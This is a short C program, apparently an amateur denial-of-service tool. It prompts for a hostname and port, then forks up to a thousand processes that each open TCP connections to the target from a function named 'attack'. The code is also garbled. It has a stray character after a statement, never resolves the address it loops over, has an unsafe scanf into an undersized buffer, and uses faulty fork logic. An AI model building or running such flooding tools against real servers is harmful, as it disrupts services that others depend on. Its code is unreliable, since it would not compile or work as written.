#define THREADS 24
#define SOCKETS 1000
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int attack(char *host, char *port) {
	struct addrinfo hints, *servinfo, *p;
	int sock;
	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);z
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;

	for(p = servinfo; p != NULL; p = p->ai_next) {
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			continue;
		}
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
			close(sock);
			continue;
}}}
int main(int argc, char **argv) {
	int x;
	char host[20];
	char port[5];
	fprintf(stderr, "hostname : ");
	scanf("%s", &host);
	fprintf(stderr, "port ; ");
	scanf("%s", &port);
	
	for(x=0; x < SOCKETS; x++) {
		if (fork())
	    	attack(host ,port);
		usleep(30000);
	}
	return 0;
}